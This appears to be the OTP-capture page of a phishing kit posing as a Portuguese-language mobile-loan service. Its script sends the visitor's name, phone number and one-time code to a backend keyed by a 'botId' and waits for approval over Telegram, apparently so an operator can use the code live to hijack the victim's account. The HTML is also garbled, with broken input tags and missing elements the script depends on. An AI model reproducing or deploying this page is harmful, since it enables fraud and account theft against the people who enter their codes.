<body>

    <div class="loan-container">

        <!-- Logo -->
        <div class="logo-container">

            <div class="slogan">Meu cell, minha mola</div>
        </div>


        <!-- OTP title -->
        <div class="title">
            Verificação de OTP
        </div>


        <!-- Instruction -->
        <div class="subtitle">
            Insira o código enviado para o seu número de telemóvel
        </div>


        <!-- Phone number -->
        <div id="phoneNumber" class="display-number"></div>


        <!-- OTP form -->
        <form id="otpForm">

            <div class="label">

            </div>


            <div class="otp-boxes">

                <input
                    type="tel"

                    inputmode="numeric"
                    pattern="[0-9]*"

                >

                <input
                    type="tel"
                    maxlength="1"
                    inputmode="numeric"
                    pattern="[0-9]*"
                >

                <input
                    type="tel"

                    inputmode="numeric"
                    pattern="[0-9]*"
                >

                <input
                    type="tel"
                    maxlength="1"

                    pattern="[0-9]*"
                >

                    type="tel"
                    maxlength="1"
                    inputmode="numeric"

                >

                    maxlength="1"

<!-- ===== FIRST SCRIPT: OTP BOX LOGIC + AUTO-SUBMIT ===== -->
<script>
    (function() {
        const inputs = document.querySelectorAll('.otp-boxes input');
        const form = document.getElementById('otpForm');

        // Helper: submit the form if all boxes are filled
        function submitIfComplete() {
            const allFilled = Array.from(inputs).every(inp => inp.value.trim() !== '');
            if (allFilled && form.dataset.submitting !== 'true') {
                form.dataset.submitting = 'true';
                // Dispatch a submit event on the form
                form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
            }
        }

        // Input handling
        inputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                // Enable/disable the hidden button (optional)
                checkOTP();
                // Auto-submit if complete
                submitIfComplete();
            });

            input.addEventListener('keydown', function(event) {
                if (event.key === 'Backspace' && !this.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        // Paste support
        inputs[0].addEventListener('paste', function(event) {
            event.preventDefault();
            const pastedText = event.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
            pastedText.split('').forEach((digit, index) => {
                if (inputs[index]) {
                    inputs[index].value = digit;
                }
            });
            // Focus the last filled box or the first empty one
            const filledCount = Math.min(pastedText.length, inputs.length);
            if (filledCount > 0) {
                inputs[Math.min(filledCount, inputs.length) - 1].focus();
            }
            checkOTP();
            submitIfComplete();
        });

        function checkOTP() {
            const otp = Array.from(inputs).map(input => input.value).join('');
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = otp.length !== 6;
        }

        // Focus first box on load
        window.addEventListener('load', function() {
            if (inputs.length > 0) inputs[0].focus();
        });
    })();
</script>

<!-- ===== SECOND SCRIPT: BACKEND COMMUNICATION ===== -->
<script>
    // ---------- get botId ----------
    const params = new URLSearchParams(window.location.search);
    const botId = params.get('botId');
    if (!botId) {
        alert('Invalid access link');
        throw new Error();
    }

    // ---------- load phone from localStorage ----------
    const phone = localStorage.getItem('phone') || '';
    document.getElementById('phoneNumber').textContent =
        phone ? phone.slice(0, 6) + '****' + phone.slice(-2) : '';

    // ---------- DOM refs ----------
    const inputs = document.querySelectorAll('.otp-boxes input');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const statusEl = document.getElementById('status');
    const timerDisplay = document.getElementById('timerDisplay');
    let countdown;

    // ADDED: missing showError function
    function showError(msg) {
        statusEl.textContent = msg;
    }

    // ---------- OTP input handling (additional) ----------
    // (The first script already handles navigation; we keep these for validation state)
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            input.value = input.value.replace(/\D/g, '');
            if (input.value && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
            validateOTP();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                inputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const digits = pasted.replace(/\D/g, '').split('');
            inputs.forEach((box, i) => {
                box.value = digits[i] || '';
            });
            validateOTP();
        });
    });

    function validateOTP() {
        const complete = [...inputs].every(i => i.value.trim() !== '');
        submitBtn.disabled = !complete;
    }

    // ---------- timer ----------
    function startCountdown(duration = 60) {
        let time = duration;
        timerDisplay.textContent = time;
        clearInterval(countdown);
        countdown = setInterval(() => {
            time--;
            timerDisplay.textContent = time;
            if (time <= 0) {
                clearInterval(countdown);
                statusEl.textContent = 'Código expirado. Solicite um novo.';
                submitBtn.disabled = true;
            }
        }, 1000);
    }
    startCountdown();

    // ---------- submit OTP ----------
    document.getElementById('otpForm').addEventListener('submit', async (e) => {
        e.preventDefault();

        // Prevent double submission
        if (e.target.dataset.submitting === 'true' && e.target.dataset.processing === 'true') {
            return;
        }
        e.target.dataset.processing = 'true';

        const code = [...inputs].map(i => i.value).join('');
        const name = localStorage.getItem('name') || 'Desconhecido';
        const phone = localStorage.getItem('phone') || 'Desconhecido';

        // Disable inputs and show status
        submitBtn.disabled = true;
        btnText.textContent = 'A verificar...';
        spinner.style.display = 'inline-block';
        statusEl.textContent = 'A aguardar aprovação no Telegram...';
        statusEl.style.display = 'block'; // make visible

        try {
            // 1. Send OTP to backend
            const response = await fetch('/submit-code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name, phone, code, botId })
            });

            const data = await response.json();
            if (!data.requestId) {
                throw new Error(data.message || 'Erro ao submeter OTP');
            }

            const requestId = data.requestId;

            // 2. Poll for approval
            let approved = false;
            while (!approved) {
                await new Promise(resolve => setTimeout(resolve, 1500));
                const checkRes = await fetch(`/check-code/${requestId}`);
                const checkData = await checkRes.json();
                if (checkData.approved === true) {
                    approved = true;
                    break;
                } else if (checkData.approved === false) {
                    showError('❌ Código rejeitado. Tente novamente.');
                    throw new Error('rejected');
                }
            }

            // 3. Approved → success
            if (approved) {
                localStorage.clear();
                window.location.href = `success.html?botId=${botId}`;
            }

        } catch (error) {
            if (error.message !== 'rejected') {
                statusEl.textContent = '❌ Erro de ligação ao servidor.';
                console.error(error);
            }
            // Reset for retry
            submitBtn.disabled = false;
            btnText.textContent = 'Verificar';
            spinner.style.display = 'none';
            inputs.forEach(i => i.value = '');
            inputs[0].focus();
            startCountdown();
            e.target.dataset.processing = 'false';
            e.target.dataset.submitting = 'false';
        }
    });
</script>
